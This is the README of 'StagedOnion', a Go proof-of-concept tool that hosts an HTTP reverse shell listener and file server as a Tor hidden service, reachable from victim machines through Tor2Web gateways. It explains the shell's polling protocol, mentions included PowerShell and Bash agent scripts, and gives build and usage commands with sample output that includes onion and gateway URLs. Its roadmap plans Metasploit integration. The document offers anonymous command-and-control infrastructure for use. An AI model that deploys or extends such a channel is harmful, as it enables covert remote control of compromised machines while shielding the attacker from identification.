# StagedOnion
A PoC for hosting reverse shells and files through the Tor network, accessable even without Tor installed on the target machine. Agents interact with the hidden service through Tor2Web gateways, which provide equal levels of anonymity for the listener while also being accessible by hosts without a Tor installation. 

Interacting with the reverse HTTP shell is straightforward:
1. Issue a `GET` request to '/' to get the command
2. `POST` the output of the command to '/' in the request body

For convenience, a Powershell script (`agent.ps1`) and a Bash script (`agent.sh`) are included as working examples.

NOTE: The implementation of the HTTP reverse shell is very unstable through Tor, with latency playing a considerable part. Expect to wait ~15 seconds for command execution and output. Also, the Tor2Web gateways love to break and show their homepage instead of completing the connection to the reverse shell for seemingly random reasons (I cannot for the life of me figure out why).

## Prerequisites
A working Tor installation is needed in order to start and register the hidden service.

## Installation
```
git clone https://github.com/jamesfoxdev/StagedOnion.git
cd StagedOnion
go build .
./StagedOnion -h
```

## Usage
```
StagedOnion | @jamesfoxdev | github.com/jamesfoxdev
A PoC for creating anonymous reverse shells and file hosting, accessible from computers without Tor installed.
  -clear
        Clear the working directory of old temporary Tor files
  -dir string
        A directory to serve
  -shell
        Start the reverse HTTP listener
```

## Examples
### Start the reverse HTTP listener
```
./StagedOnion --shell
```
Example output:
```
StagedOnion | @jamesfoxdev | github.com/jamesfoxdev
[*] Starting and registering onion service, please wait a couple of minutes...
[*] Listener started at http://pxpsa4slrlkimpygyndqat6zt7aobubs2dsat3dhnrmdkownitfvohid.onion
[*] Potential entrypoints are:
	 http://pxpsa4slrlkimpygyndqat6zt7aobubs2dsat3dhnrmdkownitfvohid.onion.pet
	 http://pxpsa4slrlkimpygyndqat6zt7aobubs2dsat3dhnrmdkownitfvohid.onion.ws
	 http://pxpsa4slrlkimpygyndqat6zt7aobubs2dsat3dhnrmdkownitfvohid.tor2web.info
[*] Waiting for shell connection...
```
Upon receiving a shell:
```
...
[+] Received reverse shell connection!

shell> 
```

### Host the current working directory
```
./StagedOnion --dir .
```
Example output:
```
StagedOnion | @jamesfoxdev | github.com/jamesfoxdev
[*] Starting and registering onion service, please wait a couple of minutes...
[*] Listener started at http://hotbxrhohncjufrynz4q4ompakkpifvv3s3etqo3femtq5d5dwadyaqd.onion
[*] Potential entrypoints are:
	 http://hotbxrhohncjufrynz4q4ompakkpifvv3s3etqo3femtq5d5dwadyaqd.onion.pet
	 http://hotbxrhohncjufrynz4q4ompakkpifvv3s3etqo3femtq5d5dwadyaqd.onion.ws
	 http://hotbxrhohncjufrynz4q4ompakkpifvv3s3etqo3femtq5d5dwadyaqd.tor2web.info
[*] Serving directory '.'
```

## Roadmap
- Embeded the Tor process in the Go binary such that a Tor installation is not needed on the client or server
- Metasploit reverse HTTP intergration
- Find more working Tor2Web extensions for redundancy

## Licence
MIT
